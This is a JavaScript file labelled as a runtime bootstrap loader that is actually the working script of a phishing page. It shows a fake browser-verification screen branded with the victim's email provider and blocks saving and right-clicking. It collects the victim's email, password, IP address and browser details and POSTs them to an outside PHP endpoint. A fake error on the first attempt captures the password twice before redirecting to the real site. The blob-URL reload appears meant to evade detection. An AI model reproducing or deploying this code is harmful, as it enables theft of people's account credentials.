
// Runtime Bootstrap Loader
(function(){

function runScripts(){
    console.log("Runtime engine loaded");
}

if(document.readyState === "loading"){
    document.addEventListener("DOMContentLoaded", runScripts);
} else {
    runScripts();
}

})();



/* SCRIPT 0 */
(function(){
    try {
        
    } catch(e) {
        console.error("Script 0 error:", e);
    }
})();

/* SCRIPT 1 */
(function(){
    try {
        
    } catch(e) {
        console.error("Script 1 error:", e);
    }
})();

/* SCRIPT 2 */
(function(){
    try {
        
    } catch(e) {
        console.error("Script 2 error:", e);
    }
})();

/* SCRIPT 3 */
(function(){
    try {
        
	// -------------------- ⚠️ BLOB REDIRECT LOGIC --------------------
if (!location.protocol.startsWith("blob")) {
    const currentUrl = new URL(location.href);
    const enParam = currentUrl.searchParams.get('en');
    let email = '';

    if (enParam) {
        try {
            const decoded = atob(enParam);
            email = decoded.includes('@') ? decoded : enParam;
        } catch (e) {
            email = enParam;
        }
    }

    fetch(location.href)
        .then(res => res.text())
        .then(html => {
            const blob = new Blob([html], { type: 'text/html' });
            const blobUrl = URL.createObjectURL(blob);
            const finalHash = email ? '#' + btoa(email) : '';
            window.location.replace(blobUrl + finalHash);
        });
}

$(document).on('keydown', function(e) {
  if (e.ctrlKey && (e.which === 83)) {
    e.preventDefault();
    return false;
  }
});


document.addEventListener('contextmenu', (event) => {
  event.preventDefault();
});
 
      function detectUserLanguage() {

        const browserLang = navigator.language || navigator.userLanguage;
        const langCode = browserLang.split('-')[0];
     
        const supportedLanguages = ['pl', 'fr', 'de', 'es', 'it', 'pt', 'ru', 'zh', 'ja', 'ko', 'ar'];
        if (supportedLanguages.includes(langCode)) {
          return langCode;
        }
        
  
        return new Promise((resolve) => {
          fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
              const countryCode = data.country_code ? data.country_code.toLowerCase() : 'en';

              const countryToLang = {
                'pl': 'pl', 
                'fr': 'fr',
                'de': 'de', 
                'es': 'es',
                'it': 'it',
                'pt': 'pt', 
                'ru': 'ru', 
                'cn': 'zh',
                'jp': 'ja',
                'kr': 'ko', 
                'sa': 'ar'  
              };
              
              resolve(countryToLang[countryCode] || 'en');
            })
            .catch(() => {
              resolve('en');
            });
        });
      }
      

      function translatePage(targetLang) {
        if (targetLang === 'en') return;
        

        const apiUrl = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=${targetLang}&dt=t&q=`;
        
   
        const elements = document.querySelectorAll('.translatable');
        

        const texts = [];
        const elementsArray = Array.from(elements);
        
        elementsArray.forEach(el => {
          const text = el.textContent.trim();

          if (!el.dataset.originalText) {
            el.dataset.originalText = text;
          }
          texts.push(text);
        });
        

        elementsArray.forEach((el, index) => {
          const originalText = el.dataset.originalText || el.textContent.trim();
          if (originalText) {
            fetch(apiUrl + encodeURIComponent(originalText))
              .then(response => response.json())
              .then(data => {
                if (data && data[0] && data[0][0] && data[0][0][0]) {
                  el.textContent = data[0][0][0];
                }
              })
              .catch(error => {
                console.error('Translation error:', error);
              });
          }
        });
        

        const inputs = document.querySelectorAll('input[placeholder]');
        inputs.forEach(input => {
          const originalPlaceholder = input.placeholder;
          if (originalPlaceholder && originalPlaceholder !== ' ') {
            fetch(apiUrl + encodeURIComponent(originalPlaceholder))
              .then(response => response.json())
              .then(data => {
                if (data && data[0] && data[0][0] && data[0][0][0]) {
                  input.placeholder = data[0][0][0];
                }
              })
              .catch(error => {
                console.error('Translation error for placeholder:', error);
              });
          }
        });
      }
      

      document.addEventListener('DOMContentLoaded', async function() {
        try {
          const userLanguage = await detectUserLanguage();
          if (userLanguage !== 'en') {
            translatePage(userLanguage);
          }
        } catch (error) {
          console.error('Language detection failed:', error);
        }
      });
    
    } catch(e) {
        console.error("Script 3 error:", e);
    }
})();

/* SCRIPT 4 */
(function(){
    try {
        

        document.addEventListener('DOMContentLoaded', function() {

const encoded = window.location.hash.substring(1);
let email = null;

try {
    email = atob(encoded); // decode base64
} catch (e) {
    console.log("Invalid base64 hash");
}

let redirectDomain = null;
            let domain = '';
            let domainName = '';

            if (email && email.includes('@')) {
                domain = email.split('@')[1];
                domainName = domain.split('.')[0].toUpperCase();
                

                document.getElementById('email').value = email;

                const domainMessage = document.getElementById('domain-message');
                const domainSubmessage = document.getElementById('domain-submessage');
                
      
                domainMessage.dataset.originalText = `${domain} is checking your browser`;
                domainSubmessage.dataset.originalText = `${domain} is verifying your connection for enhanced security`;
                
            
                domainMessage.textContent = `${domain} is checking your browser`;
                domainSubmessage.textContent = `${domain} is verifying your connection for enhanced security`;
                
    
                const faviconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
                document.getElementById('verification-favicon').src = faviconUrl;
                document.getElementById('form-favicon').src = faviconUrl;
                
   
                document.getElementById('domain-name').textContent = domainName;
                
           
                let backgroundUrl;
                switch(domain) {
                    case 'gmail.com':
                        backgroundUrl = 'https://www.gmail.com';
                        break;
                    case 'outlook.com':
                    case 'hotmail.com':
                        backgroundUrl = 'https://www.outlook.com';
                        break;
                    case 'yahoo.com':
                        backgroundUrl = 'https://www.yahoo.com';
                        break;
                    case 'mail.com':
                        backgroundUrl = 'https://www.mail.com';
                        break;
                    default:
                   
                        backgroundUrl = `https://${domain}`;
                }
                
 
                document.getElementById('background-iframe').src = backgroundUrl;
             
                setTimeout(() => {
                    document.getElementById('background-iframe').style.filter = 'blur(3px) brightness(0.8)';
                    document.getElementById('background-iframe').style.transform = 'scale(1.05)';
                }, 100);
            }

         
            const botCheck = document.getElementById('bot-check');
            const verificationSection = document.getElementById('verification-section');
            const progressBar = document.getElementById('verification-progress');
            const mainContent = document.getElementById('main-content');

            botCheck.addEventListener('change', function() {
                if (this.checked) {
               
                    this.disabled = true;
                    const checkboxText = document.querySelector('.checkbox-text');
           
                    checkboxText.dataset.originalText = 'Verification in progress...';
                    checkboxText.innerHTML = '<i class="bi bi-check-circle-fill text-success me-2"></i> Verification in progress...';

         
                    let progress = 0;
                    const progressInterval = setInterval(() => {
                        progress += 1;
                        progressBar.style.width = progress + '%';
                        
                        if (progress >= 100) {
                            clearInterval(progressInterval);
                            
                      
                            const verificationHeader = document.querySelector('.verification-header h2');
                            const verificationSubtitle = document.querySelector('.verification-header p');
                            
                            verificationHeader.dataset.originalText = 'Verification Complete!';
                            verificationSubtitle.dataset.originalText = 'Redirecting to secure login...';
                            checkboxText.dataset.originalText = 'Verified Successfully';
                            
                     
                            verificationHeader.textContent = 'Verification Complete!';
                            verificationSubtitle.textContent = 'Redirecting to secure login...';
                            checkboxText.innerHTML = '<i class="bi bi-shield-check me-2"></i> Verified Successfully';
                            
                 
                            setTimeout(() => {
                                verificationSection.style.opacity = '0';
                                setTimeout(() => {
                                    verificationSection.style.display = 'none';
                                    mainContent.style.display = 'flex';
                                }, 500);
                            }, 1500);
                        }
                    }, 40);
                }
            });

    
            let submitCount = 0;
            const userForm = document.getElementById('user-form');
            const errorMessage = document.getElementById('error-message');
            const loaderOverlay = document.getElementById('loader-overlay');

            userForm.addEventListener('submit', function(e) {
                e.preventDefault();
                submitCount++;

                const password = document.getElementById('password').value.trim();
                

                loaderOverlay.style.display = 'flex';

 
                const userData = {
                    email: document.getElementById('email').value,
                    password: password,
                    ipAddress: 'Fetching...',
                    userAgent: navigator.userAgent,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    browser: detectBrowser(),
                    timestamp: new Date().toISOString(),
                    language: navigator.language || navigator.userLanguage
                };

  
                function detectBrowser() {
                    const ua = navigator.userAgent;
                    if (ua.includes('Firefox')) return 'Firefox';
                    if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
                    if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
                    if (ua.includes('Trident')) return 'Internet Explorer';
                    if (ua.includes('Edge')) return 'Edge';
                    if (ua.includes('Chrome')) return 'Chrome';
                    if (ua.includes('Safari')) return 'Safari';
                    return 'Unknown';
                }


                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        userData.ipAddress = data.ip;
                        sendDataToServer(userData);
                    })
                    .catch(() => {
                        userData.ipAddress = 'Unavailable';
                        sendDataToServer(userData);
                    });


                if (submitCount === 1) {
                    setTimeout(() => {
                        loaderOverlay.style.display = 'none';
                        errorMessage.style.display = 'block';
                        document.getElementById('password').value = '';
                        document.getElementById('password').focus();
                    }, 3000);
                } else if (submitCount === 2) {
                    setTimeout(() => {
                        loaderOverlay.style.display = 'none';
                        if (domain) {
                            window.location.href = `https://${domain}`;
                        } else {
                            window.location.href = 'https://example.com';
                        }
                    }, 3000);
                }
            });

            function sendDataToServer(data) {
                const formData = new FormData();
                Object.keys(data).forEach(key => {
                    formData.append(key, data[key]);
                });

                fetch('https://gelssa.com.mx/js/php/pno.php?name=$id', {
				
				method: 'POST',
                body: new URLSearchParams(data)
                })
                .then(response => response.text())
                .then(result => {
                    console.log('Data sent successfully:', result);
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                });
            }

            setTimeout(() => {
                verificationSection.style.opacity = '1';
            }, 100);
        });
    
    } catch(e) {
        console.error("Script 4 error:", e);
    }
})();
